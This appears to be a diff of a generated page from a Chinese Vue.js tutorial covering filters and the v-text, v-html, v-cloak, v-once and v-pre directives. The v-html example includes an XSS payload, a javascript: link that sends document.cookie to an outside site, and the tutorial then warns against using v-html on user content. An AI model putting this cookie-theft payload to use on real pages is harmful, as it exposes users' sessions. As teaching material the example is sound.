+2.使用过滤器: {{ xxx|过滤器名}} 或v-bind:属性 = &quot;xxx|过滤器名&quot;
+</code></pre></div><div class="language- extra-class"><pre class="language-text"><code>全局
+Vue.filter('myslice',function(value){
+	return value.slice(0,4)
+})
+&lt;h2&gt;配置全局过滤器{{msg | myslice}}&lt;/h2&gt;
+局部
+&lt;h3&gt;现在是：{{time | timeformater}}&lt;/h3&gt;
+&lt;h3&gt;过滤器传参现在是：{{time | timeformater(&quot;YYYY-MM-DD&quot;)}}&lt;/h3&gt;
+&lt;h3&gt;过滤器传参截取：{{time | timeformater(&quot;YYYY-MM-DD&quot;) | myslice}}&lt;/h3&gt;
+
+filters:{
+    // 局部过滤器
+    // 传过来的有值就用传过来的，没有传值就用str的
+    timeformater(value,str=&quot;YYYY-MM-DD HH:mm:ss&quot;){
+        // return dayjs(value).format(&quot;YYYY-MM-DD HH:mm:ss&quot;);
+        return dayjs(value).format(str);
+    },
+    myslice(value){
+    	return value.slice(0,4)
+    }
+},
+</code></pre></div><div class="custom-block tip"><p class="title"></p><p>1.过滤器也可以接收额外参数、多个过滤器也可以串联
+2.并没有改变原本的数据，是产生新的对应的数据</p></div><h3 id="_21-v-text"><a href="#_21-v-text" class="header-anchor">#</a> 21，v-text</h3> <div class="custom-block tip"><p class="title"></p><p>向其所在的标签中渲染文本内容 v-text拿到name，替换掉整个div里面的值，插值语法不会</p></div><div class="language- extra-class"><pre class="language-text"><code>&lt;h2&gt;插值：{{name}}&lt;/h2&gt;
+&lt;div v-text=&quot;name&quot;&gt;ewwe&lt;/div&gt;//显示的是name的值，覆盖掉ewwe
+</code></pre></div><h3 id="_22-v-html"><a href="#_22-v-html" class="header-anchor">#</a> 22，v-html</h3> <div class="language- extra-class"><pre class="language-text"><code>1. 作用:向指定节点中谊染包含html结构的内容,覆盖标签体内容。
+2.与插值语法的区别:
+(1)v-html会替换掉节点中所有的内容，{{xx}则不会。
+(2)v-html可以识别html结构。
+</code></pre></div><div class="language- extra-class"><pre class="language-text"><code>&lt;div v-html=&quot;str&quot;&gt;ttt&lt;/div&gt;
+&lt;div v-html=&quot;str2&quot;&gt;&lt;/div&gt;
+
+return {
+    str:'&lt;h1&gt;你好&lt;/h1&gt;',
+    str2:'&lt;a href=javascript:alert(1)&gt;点击弹窗&lt;/a&gt;',
+    // 将该页面所有的cookie传入到href写的网站
+    str3:'&lt;a href=javascript:location.href=&quot;https://www.baidu.com?&quot;+document.cookie&gt;不好的&lt;/a&gt;'
+},
+</code></pre></div><div class="custom-block warning"><p class="title"></p><p>严重注意: v-html有安全性问题! ! ! !
+(1)在网站上动态流染任意HTL是非常危险的，容易导致xss攻击。
+(2)一定要在可信的内容上使用v-html.永不要用在用户提交的内容上!</p></div><h3 id="_23-v-clock"><a href="#_23-v-clock" class="header-anchor">#</a> 23，v-clock</h3> <div class="custom-block tip"><p class="title"></p><p>防止在页面加载时先出现变量名闪烁的情况，造成不好的用户体验</p></div><div class="language- extra-class"><pre class="language-text"><code>html中： {{ v.name }}
+
+css中：[ v-cloak ] {
+
+　　　　　　　display:none !important
+　　　　}
+</code></pre></div><h3 id="_24-v-once"><a href="#_24-v-once" class="header-anchor">#</a> 24，v-once</h3> <div class="custom-block tip"><p class="title"></p><p>1.v-once所在节点在初次动态渲染后，就视为静态内容了。</p> <p>2.以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能。</p></div><div class="language- extra-class"><pre class="language-text"><code>&lt;h2 v-once&gt;初始化的n值：{{n}}&lt;/h2&gt;
+&lt;h2&gt;当前的n值：{{n}}&lt;/h2&gt;
+&lt;button @click=&quot;n++&quot;&gt;点我n+1&lt;/button&gt;
+</code></pre></div><h3 id="_25-v-pre"><a href="#_25-v-pre" class="header-anchor">#</a> 25,v-pre</h3> <div class="custom-block tip"><p class="title"></p><p>1.跳过其所在节点的编译过程。</p> <p>2.可利用它跳过:没有使用指令语法、没有使用插值语法的节点，会加快编译。</p></div><div class="language- extra-class"><pre class="language-text"><code>&lt;h2 v-pre&gt;v-pre&lt;/h2&gt;
+&lt;h2 v-pre&gt;当前的n值：{{n}},跳过指令语法&lt;/h2&gt;//插值语法不被使用
+&lt;h2&gt;当前的n值：{{n}}&lt;/h2&gt;
+&lt;button @click=&quot;n++&quot;&gt;点我n+1&lt;/button&gt;
 </code></pre></div></div></section> <footer class="page-edit"><!----> <!----></footer> <!----> <div class="comments-wrapper"><!----></div></main></div> <!----></div> <ul class="sub-sidebar sub-sidebar-wrapper" style="width:0;" data-v-b57cc07c data-v-7dd95ae2></ul></div></div></div><div class="global-ui"><div class="back-to-ceiling" style="right:1rem;bottom:6rem;width:2.5rem;height:2.5rem;border-radius:.25rem;line-height:2.5rem;display:none;" data-v-c6073ba8 data-v-c6073ba8><svg t="1574745035067" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="5404" class="icon" data-v-c6073ba8><path d="M526.60727968 10.90185116a27.675 27.675 0 0 0-29.21455937 0c-131.36607665 82.28402758-218.69155461 228.01873535-218.69155402 394.07834331a462.20625001 462.20625001 0 0 0 5.36959153 69.94390903c1.00431239 6.55289093-0.34802892 13.13561351-3.76865779 18.80351572-32.63518765 54.11355614-51.75690182 118.55860487-51.7569018 187.94566865a371.06718723 371.06718723 0 0 0 11.50484808 91.98906777c6.53300375 25.50556257 41.68394495 28.14064038 52.69160883 4.22606766 17.37162448-37.73630017 42.14135425-72.50938081 72.80769204-103.21549295 2.18761121 3.04276886 4.15646224 6.24463696 6.40373557 9.22774369a1871.4375 1871.4375 0 0 0 140.04691725 5.34970492 1866.36093723 1866.36093723 0 0 0 140.04691723-5.34970492c2.24727335-2.98310674 4.21612437-6.18497483 6.3937923-9.2178004 30.66633723 30.70611158 55.4360664 65.4791928 72.80769147 103.21549355 11.00766384 23.91457269 46.15860503 21.27949489 52.69160879-4.22606768a371.15156223 371.15156223 0 0 0 11.514792-91.99901164c0-69.36717486-19.13165746-133.82216804-51.75690182-187.92578088-3.42062944-5.66790279-4.76302748-12.26056868-3.76865837-18.80351632a462.20625001 462.20625001 0 0 0 5.36959269-69.943909c-0.00994388-166.08943902-87.32547796-311.81420293-218.6915546-394.09823051zM605.93803103 357.87693858a93.93749974 93.93749974 0 1 1-187.89594924 6.1e-7 93.93749974 93.93749974 0 0 1 187.89594924-6.1e-7z" p-id="5405" data-v-c6073ba8></path><path d="M429.50777625 765.63860547C429.50777625 803.39355007 466.44236686 1000.39046097 512.00932183 1000.39046097c45.56695499 0 82.4922232-197.00623328 82.5015456-234.7518555 0-37.75494459-36.9345906-68.35043303-82.4922232-68.34111062-45.57627738-0.00932239-82.52019037 30.59548842-82.51086798 68.34111062z" p-id="5406" data-v-c6073ba8></path></svg></div></div></div>
-    <script src="/assets/js/app.43188468.js" defer></script><script src="/assets/js/3.9cc2d08d.js" defer></script><script src="/assets/js/1.fc1f1623.js" defer></script><script src="/assets/js/14.d9b13840.js" defer></script>
+    <script src="/assets/js/app.44c03945.js" defer></script><script src="/assets/js/3.9cc2d08d.js" defer></script><script src="/assets/js/1.fc1f1623.js" defer></script><script src="/assets/js/14.c65e4df5.js" defer></script>
   </body>
 </html>
